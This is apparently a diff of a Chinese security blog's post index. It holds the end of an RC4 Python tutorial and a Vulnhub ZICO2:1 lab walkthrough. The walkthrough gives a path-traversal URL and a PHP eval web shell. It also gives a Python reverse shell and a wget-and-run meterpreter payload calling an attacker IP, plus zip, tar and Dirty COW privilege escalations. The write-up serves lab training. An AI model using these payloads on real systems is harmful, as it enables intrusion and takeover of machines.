+<h2 id="2、Python"><a href="#2、Python" class="headerlink" title="2、Python"></a>2、Python</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># rc4.<span class="function">py</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> base64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">rc4_init_sbox</span><span class="params">(key)</span>:</span></span><br><span class="line"><span class="function">    s_box </span>= <span class="built_in">list</span>(range(<span class="number">256</span>))  # 没管秘钥小于<span class="number">256</span>的情况，小于<span class="number">256</span>不断重复填充即可</span><br><span class="line">    length = len(key)</span><br><span class="line">    <span class="meta"># print(<span class="meta-string">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span></span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">        T.append(key[i % length])</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(T[i])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    print(<span class="string">&quot;混乱后的 s 盒：%s&quot;</span>% s_box)</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rc4_encrypt(s_box, data):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">for</span> k in range(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(chr(ord(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;RC4加密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    print(<span class="string">&quot;RC4加密后(Base64编码)的字c符串是:&quot;</span> + str(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> str(base64.b64encode(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rc4_decrypt(s_box, data):</span><br><span class="line">    data = base64.b64decode(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    data = bytes.decode(data)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    length = len(data)</span><br><span class="line">    <span class="keyword">for</span> k in range(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        s = s_box[t]</span><br><span class="line">        res.append(chr(ord(data[k]) ^ s))</span><br><span class="line">    result = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;RC4解密后的字符串是:%s&quot;</span> % result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="meta"># main.py</span></span><br><span class="line">from rc4 <span class="keyword">import</span> rc4_init_sbox, rc4_encrypt, rc4_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        function = input(<span class="string">&quot;E to encrypt or D to decrypt for rc4:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> function.upper() == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">            data = input(<span class="string">&quot;请输入你要进行RC4加密的数据：&quot;</span>)</span><br><span class="line">            key = input(<span class="string">&quot;请输入RC4加密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_encrypt(s_box, data)</span><br><span class="line">        elif function.upper() == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">            data = input(<span class="string">&quot;请输入你要进行RC4解密的数据：&quot;</span>)</span><br><span class="line">            key = input(<span class="string">&quot;请输入RC4解密密钥：&quot;</span>)</span><br><span class="line">            s_box = rc4_init_sbox(key)</span><br><span class="line">            rc4_decrypt(s_box, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;请输入正确的功能&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>参考链接：</p>
+<ul>
+<li><p><a href="https://www.cnblogs.com/gambler/p/9075415.html">https://www.cnblogs.com/gambler/p/9075415.html</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/block2016/p/5601925.html">https://www.cnblogs.com/block2016/p/5601925.html</a></p>
+</li>
+<li><p><a href="https://www.jianshu.com/p/d9ad5fc524ec">https://www.jianshu.com/p/d9ad5fc524ec</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>密码学</tag>
       </tags>
   </entry>
   <entry>
@@ -771,6 +771,144 @@
       <tags>
         <tag>SQL注入</tag>
         <tag>UQCMS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub——ZICO2:1</title>
+    <url>/post/da4faa60.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
+<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，疯狂按shift，进入如下界面后，按e</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000543450.png" alt="image-20211209000543450"></p>
+<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000709270.png" alt="image-20211209000709270"></p>
+<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
+<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000757183.png" alt="image-20211209000757183"></p>
+<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
+<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001103683.png" alt="image-20211209001103683"></p>
+<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001214999.png" alt="image-20211209001214999"></p>
+<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;可以看到开启了SSH，HTTP等服务</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001421801.png" alt="image-20211209001421801"></p>
+<blockquote>
+<p>111端口RPCBIND用于取代旧版本中的portmap组件。<br>简单说，RPCBIND就是为了将不同服务与对应的端口进行绑定，以便支持机器间的相互操作</p>
+</blockquote>
+<p>&emsp;&emsp;访问80端口的服务，是一个网站</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001534937.png" alt="image-20211209001534937"></p>
+<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;使用dirsearch扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.8</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;扫出了个<code>/dbadmin</code>目录很可疑</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001808868.png" alt="image-20211209001808868"></p>
+<p>&emsp;&emsp;访问该目录，发现有个PHP文件，点击访问，发现是个后台登录页面，并且提示了框架信息，phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002030658.png" alt="image-20211209002030658"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002042837.png" alt="image-20211209002042837"></p>
+<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、Owasp-zap扫描"><a href="#1、Owasp-zap扫描" class="headerlink" title="1、Owasp-zap扫描"></a>1、Owasp-zap扫描</h2><p>&emsp;&emsp;使用owasp-zap对网站进行扫描，owasp-zap是一个对网站进行自动漏洞扫描的工具</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002516533.png" alt="image-20211209002516533"></p>
+<p>&emsp;&emsp;扫描结束，Alerts一栏为有漏洞的地方，旗子衍颜色越胜代表漏洞越严重，这里发现其中有一个目录遍历的漏洞，<code>http://192.168.43.8/view.php?page=../../../../../../etc/passwd</code>，进入该页面发现的确爆出了用户名的相关信息</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002654692.png" alt="image-20211209002654692"></p>
+<p>&emsp;&emsp;这里其实也可以在主页，点击CHENC THEM OUT!按钮，会发现URL变成了<a href="http://192.168.43.8/view.php?page=tools.html%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E8%BF%99%E6%A0%B7%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E7%9A%84%E7%A1%AE%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">http://192.168.43.8/view.php?page=tools.html，可能存在文件包含，这样也可以发现的确存在文件包含</a></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003048221.png" alt="image-20211209003048221"></p>
+<p>&emsp;&emsp;只要看到文件包含这种URL路径，就要想到可以利用的点大概有以下几点</p>
+<blockquote>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、</span>	<span class="string">任意url跳转</span></span><br><span class="line"><span class="number">2</span><span class="string">、</span>	<span class="string">Ssrf</span></span><br><span class="line"><span class="number">3</span><span class="string">、</span>	<span class="string">文件包含</span></span><br><span class="line"><span class="number">4</span><span class="string">、</span>	<span class="string">Sql注入</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="2、爆破密码"><a href="#2、爆破密码" class="headerlink" title="2、爆破密码"></a>2、爆破密码</h2><p>&emsp;&emsp;后台登录只验证了密码，可以尝试使用字典对其进行爆破，或者使用弱口令，这里密码是admin，直接进入后台</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002837222.png" alt="image-20211209002837222"></p>
+<h2 id="3、信息搜集"><a href="#3、信息搜集" class="headerlink" title="3、信息搜集"></a>3、信息搜集</h2><p>&emsp;&emsp;在users表可以看到有两个用户信息</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003527407.png" alt="image-20211209003527407"></p>
+<p>&emsp;&emsp;丢到md5解密看看</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003711369.png" alt="image-20211209003711369"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003813350.png" alt="image-20211209003813350"></p>
+<p>&emsp;&emsp;得到两个账号密码</p>
+<ul>
+<li>用户名：root   密码：34kroot34</li>
+<li>用户名：zico    密码：zico2215@</li>
+</ul>
+<p>&emsp;&emsp;使用<code>searchsploit phpliteadmin</code>命令，搜索是否有能够利用的EXP，发现确实存在对应版本的利用脚本</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209155456133.png" alt="image-20211209155456133"></p>
+<p>&emsp;&emsp;查看说明，意思就是可以利用phpLiteAdmin，创建一个数据库，这个数据库名称起名为xx.php，如果后端没有这个数据库，比如hack.php，会自动创建一个数据库名称的文件，然后在里面填充数据，比如<code>&lt;?php phpinfo()?&gt;</code>，然后访问，会发现执行成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209155714073.png" alt="image-20211209155714073"></p>
+<p>&emsp;&emsp;这里我有两个想法</p>
+<ol>
+<li>用SSH登录账号密码，看能否成功</li>
+<li>利用phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞</li>
+</ol>
+<h2 id="想法一：用SSH登录"><a href="#想法一：用SSH登录" class="headerlink" title="想法一：用SSH登录"></a>想法一：用SSH登录</h2><p>&emsp;&emsp;发现事情并不简单，登录失败。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004421258.png" alt="image-20211209004421258"></p>
+<h2 id="想法二：利用远程php代码执行漏洞"><a href="#想法二：利用远程php代码执行漏洞" class="headerlink" title="想法二：利用远程php代码执行漏洞"></a>想法二：利用远程php代码执行漏洞</h2><p>&emsp;&emsp;步骤一：返回到数据库管理页面先创造一个.php文件作为数据库</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004844688.png" alt="image-20211209004844688"></p>
+<p>&emsp;&emsp;步骤二：在该数据库（php文件下）创建一个数据表a（随便设置名字）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004954886.png" alt="image-20211209004954886"></p>
+<p>&emsp;&emsp;步骤三：在Default Value下插入一句话木马（因为在这里上传的一句话中引号会被过滤，所以一句话不含单引号；）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[ok]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010553084.png" alt="image-20211209010553084"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010559508.png" alt="image-20211209010559508"></p>
+<p>&emsp;&emsp;使用文件包含一句话木马</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010758912.png" alt="image-20211209010758912"></p>
+<p>&emsp;&emsp;步骤五：上菜刀，只是www-data还不是最高的root权限</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209011349557.png" alt="image-20211209011349557"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209011609403.png" alt="image-20211209011609403"></p>
+<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><h2 id="方法一：python反弹shell"><a href="#方法一：python反弹shell" class="headerlink" title="方法一：python反弹shell"></a>方法一：python反弹shell</h2><p>&emsp;&emsp;在kali端监听并且开放端口4444，在页面url使用以下pyhon反shell的payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.8</span>/view.php?page=../../../../../usr/databases/w01ke.php&amp;ok=</span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.43.167&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="方法二：利用php反shell"><a href="#方法二：利用php反shell" class="headerlink" title="方法二：利用php反shell"></a>方法二：利用php反shell</h2><p>&emsp;&emsp;思路：用kali下msfvenom生成一个后门文件，然后利用之前的一句话木马，命令执行，让靶机将后门文件主动下载到本机，然后弹回shell</p>
+<p>&emsp;&emsp;首先创建后门文件，名字为shell命令为：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.167 LPORT=5555 -f elf  -o shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209160542854.png" alt="image-20211209160542854"></p>
+<p>&emsp;&emsp;执行命令 <code>cp shell /var/www/html</code>，将后门文件复制到apache的网站根目录</p>
+<p>&emsp;&emsp;执行命令 <code>chmod 777 /var/www/html/shell</code>，赋予后门文件可读可写可执行权限</p>
+<p>&emsp;&emsp;执行命令 <code>service apache2 start</code>，启动攻击机的apache服务</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209161335056.png" alt="image-20211209161335056"></p>
+<p>&emsp;&emsp;msfconsole监听</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.167</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209161856847.png" alt="image-20211209161856847"></p>
+<p>&emsp;&emsp;利用之前上传的一句话，让靶机主动下载该文件，反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok=system(&quot;cd /tmp;wget http://192.168.43.167/shell;chmod 777 shell;./shell&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209162806633.png" alt="image-20211209162806633"></p>
+<p>&emsp;&emsp;进入shell，调用交互式命令行，同时美化命令行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="六、提权"><a href="#六、提权" class="headerlink" title="六、提权"></a>六、提权</h1><p>&emsp;&emsp;进入到/home目录，查看文件，发现所要进行的下一步操作提示</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209163613674.png" alt="image-20211209163613674"></p>
+<p>&emsp;&emsp;进入到wordpress目录下，发现wordpress配置文件，使用cat命令查看到账号密码（如果此时看不到，那么到meterpreter界面，利用download命令，将文件下载到本地进行查看<code>download /home/zico/wordpress/wp-config.php /root</code>）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209163800306.png" alt="image-20211209163800306"></p>
+<p>&emsp;&emsp;尝试用得到的账号密码，通过22端口的ssh登录主机，登录成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164012006.png" alt="image-20211209164012006"></p>
+<p>&emsp;&emsp;下一步就是进行提权，获得root权限，来得到最后的flag</p>
+<h2 id="1、zip提权"><a href="#1、zip提权" class="headerlink" title="1、zip提权"></a>1、zip提权</h2><p>&emsp;&emsp;执行命令：<code>sudo -l</code>，查看哪些命令具有root权限，发现具有root权限的为两个解压用的命令可执行</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164131400.png" alt="image-20211209164131400"></p>
+<p>&emsp;&emsp;可以利用zip命令来进行提权</p>
+<p>&emsp;&emsp;在/tmp目录下创建一个exploit名字的文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch /tmp/exploit</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;使用以下命令，提权成功，查看flag</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164415754.png" alt="image-20211209164415754"></p>
+<h2 id="2、tar提权"><a href="#2、tar提权" class="headerlink" title="2、tar提权"></a>2、tar提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/tar cf /dev/null /pwnd --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209170249295.png" alt="image-20211209170249295"></p>
+<h2 id="3、脏牛提权"><a href="#3、脏牛提权" class="headerlink" title="3、脏牛提权"></a>3、脏牛提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.43.167/dirty.c -O /tmp/dirty.c</span><br><span class="line">gcc -pthread dirty.c -o exp -lcrypt    <span class="comment"># 编译</span></span><br><span class="line">./exp w01ke   <span class="comment"># 使用exp，后面的w01ke是密码</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>&emsp;&emsp;这种自解压的tar和zip提权，需要很多前提条件，真实环境中管理员也不会单独给某个用户zip这样的权限，这种提权方式CTF或许会用到，但是实际环境基本不会有用</p>
+]]></content>
+      <categories>
+        <category>综合靶场</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -942,144 +1080,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Vulnhub——ZICO2:1</title>
-    <url>/post/da4faa60.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
-<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，疯狂按shift，进入如下界面后，按e</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000543450.png" alt="image-20211209000543450"></p>
-<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000709270.png" alt="image-20211209000709270"></p>
-<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
-<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000757183.png" alt="image-20211209000757183"></p>
-<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
-<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001103683.png" alt="image-20211209001103683"></p>
-<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001214999.png" alt="image-20211209001214999"></p>
-<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;可以看到开启了SSH，HTTP等服务</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001421801.png" alt="image-20211209001421801"></p>
-<blockquote>
-<p>111端口RPCBIND用于取代旧版本中的portmap组件。<br>简单说，RPCBIND就是为了将不同服务与对应的端口进行绑定，以便支持机器间的相互操作</p>
-</blockquote>
-<p>&emsp;&emsp;访问80端口的服务，是一个网站</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001534937.png" alt="image-20211209001534937"></p>
-<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;使用dirsearch扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.8</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;扫出了个<code>/dbadmin</code>目录很可疑</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001808868.png" alt="image-20211209001808868"></p>
-<p>&emsp;&emsp;访问该目录，发现有个PHP文件，点击访问，发现是个后台登录页面，并且提示了框架信息，phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002030658.png" alt="image-20211209002030658"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002042837.png" alt="image-20211209002042837"></p>
-<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、Owasp-zap扫描"><a href="#1、Owasp-zap扫描" class="headerlink" title="1、Owasp-zap扫描"></a>1、Owasp-zap扫描</h2><p>&emsp;&emsp;使用owasp-zap对网站进行扫描，owasp-zap是一个对网站进行自动漏洞扫描的工具</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002516533.png" alt="image-20211209002516533"></p>
-<p>&emsp;&emsp;扫描结束，Alerts一栏为有漏洞的地方，旗子衍颜色越胜代表漏洞越严重，这里发现其中有一个目录遍历的漏洞，<code>http://192.168.43.8/view.php?page=../../../../../../etc/passwd</code>，进入该页面发现的确爆出了用户名的相关信息</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002654692.png" alt="image-20211209002654692"></p>
-<p>&emsp;&emsp;这里其实也可以在主页，点击CHENC THEM OUT!按钮，会发现URL变成了<a href="http://192.168.43.8/view.php?page=tools.html%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E8%BF%99%E6%A0%B7%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E7%9A%84%E7%A1%AE%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">http://192.168.43.8/view.php?page=tools.html，可能存在文件包含，这样也可以发现的确存在文件包含</a></p>
